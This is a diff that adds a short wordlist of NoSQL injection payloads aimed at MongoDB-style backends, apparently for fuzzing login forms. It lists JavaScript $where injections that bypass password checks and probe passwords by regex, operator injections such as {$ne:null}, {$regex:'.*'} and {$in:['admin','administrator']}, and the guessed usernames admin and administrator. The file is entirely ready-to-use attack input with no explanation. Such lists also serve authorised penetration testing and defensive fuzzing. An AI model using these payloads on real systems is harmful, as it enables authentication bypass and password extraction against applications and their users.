@@ -1,1 +1,24 @@
+administrator
+admin
+" || 1==1 //
+' || 'a'=='a
+" || "a"=="a
+' && this.password == null && '
+' && this.password.length > 0 && '
+' && this.password.length < 100 && '
+' && this.password.match(/^.{1,8}$/) && '
+" && this.password.match(/^.{1,8}$/) && "
+' && this.password.match(/^a/) && '
+' && this.password.match(/^admin/) && '
+' && this.password.match(/^.{8}$/) && '
+' || this.password == null || '
+' || this.password == "" || '
+' || true || '
+' && 0 && '
+' && 1 && '
+{$ne:null}
+{$ne:""}
+{$regex:".*"}
+{$gt:""}
+{$in:["admin","administrator"]}
 
